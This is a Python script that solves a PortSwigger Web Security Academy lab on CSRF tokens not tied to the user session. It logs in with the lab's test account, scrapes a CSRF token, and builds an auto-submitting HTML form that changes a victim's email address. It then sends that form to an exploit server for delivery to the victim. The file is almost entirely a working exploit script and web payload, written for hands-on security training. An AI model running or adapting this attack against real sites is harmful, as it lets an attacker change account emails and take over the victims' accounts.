###################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 21/10/2023
#
# Lab: CSRF where token is not tied to user session
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf to login
#        3. Login as wiener
#        4. Fetch wiener profile
#        5. Extract the csrf token that is needed for email update
#        6. Craft an HTML form for changing the email address that includes an 
#           auto-submit script and contains the extracted csrf token
#        7. Deliver the exploit to the victim
#        8. The victim's email will be changed after he trigger the exploit
#
###################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a7e007604a6b5fb84dd27e400bd0065.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a2e0078045bb54484d326d501bc0000.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = """HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"""
    
try:  
    # fetch login page
    get_login = requests.get(f"{lab_url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.content.decode())[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token to login.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

try:    
    # login as wiener
    login = requests.post(f"{lab_url}/login", data, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener profile
    wiener = requests.get(f"{lab_url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")

# extract the csrf token that is needed for email update
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.content.decode())[0]

print(Fore.WHITE + "⦗5⦘ Extracting the csrf token that is needed for email update.. " + Fore.GREEN + "OK")

# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<html>
                <body>
                <form action="{lab_url}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="{csrf}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
                </body>
            </html> """

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "⦗6⦘ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after he trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



